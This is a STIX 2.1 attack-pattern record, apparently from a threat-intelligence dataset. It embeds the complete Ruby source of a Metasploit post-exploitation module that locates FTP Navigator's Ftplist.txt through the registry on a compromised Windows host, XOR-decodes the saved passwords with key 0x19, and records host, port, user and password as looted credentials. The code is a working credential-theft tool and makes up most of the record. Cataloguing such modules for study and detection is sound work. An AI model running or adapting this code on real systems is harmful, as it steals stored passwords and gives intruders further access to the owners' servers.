{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3deed181-e5e9-436c-b649-4bdb317e2352",
    "created": "2024-08-14T16:33:11.45173Z",
    "modified": "2024-08-14T16:33:11.451734Z",
    "name": "Windows Gather FTP Navigator Saved Password Extraction",
    "description": " This module extracts saved passwords from the FTP Navigator FTP client. It will decode the saved passwords and store them in the database.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/ftpnavigator.rb",
            "external_id": "ftpnavigator.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather FTP Navigator Saved Password Extraction',\n        'Description' => %q{\n          This module extracts saved passwords from the FTP Navigator FTP client.\n          It will decode the saved passwords and store them in the database.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['theLightCosine'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    key = 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\FTP Navigator_is1\\\\'\n    val_name = 'InstallLocation'\n    installdir = registry_getvaldata(key, val_name) || 'c:\\\\FTP Navigator\\\\'\n\n    path = \"#{installdir}Ftplist.txt\"\n\n    begin\n      ftplist = client.fs.file.new(path, 'r')\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error(\"Unable to open Ftplist.txt: #{e}\")\n      print_error('FTP Navigator May not Ne Installed')\n      return\n    end\n\n    lines = ftplist.read.split(\"\\n\")\n    lines.each do |line|\n      next if line.include? 'Anonymous=1'\n      next unless line.include? ';Password='\n\n      dpass = ''\n      username = ''\n      server = ''\n      port = ''\n\n      line.split(';').each do |field|\n        next if field.include? 'SavePassword'\n\n        if field.include? 'Password='\n          epass = split_values(field)\n          dpass = decode_pass(epass)\n        elsif field.include? 'User='\n          username = split_values(field)\n        elsif field.include? 'Server='\n          server = split_values(field)\n        elsif field.include? 'Port='\n          port = split_values(field)\n        end\n      end\n\n      print_good(\"Host: #{server} Port: #{port} User: #{username} Pass: #{dpass}\")\n      service_data = {\n        address: Rex::Socket.getaddress(server),\n        port: port,\n        protocol: 'tcp',\n        service_name: 'ftp',\n        workspace_id: myworkspace_id\n      }\n\n      credential_data = {\n        origin_type: :session,\n        session_id: session_db_id,\n        post_reference_name: refname,\n        username: username,\n        private_data: dpass,\n        private_type: :password\n      }\n\n      credential_core = create_credential(credential_data.merge(service_data))\n\n      login_data = {\n        core: credential_core,\n        access_level: 'User',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }\n\n      create_credential_login(login_data.merge(service_data))\n    end\n  end\n\n  def split_values(field)\n    values = field.split('=', 2)\n    return values[1]\n  end\n\n  def decode_pass(encoded)\n    decoded = ''\n    encoded.unpack('C*').each do |achar|\n      decoded << (achar ^ 0x19)\n    end\n    return decoded\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}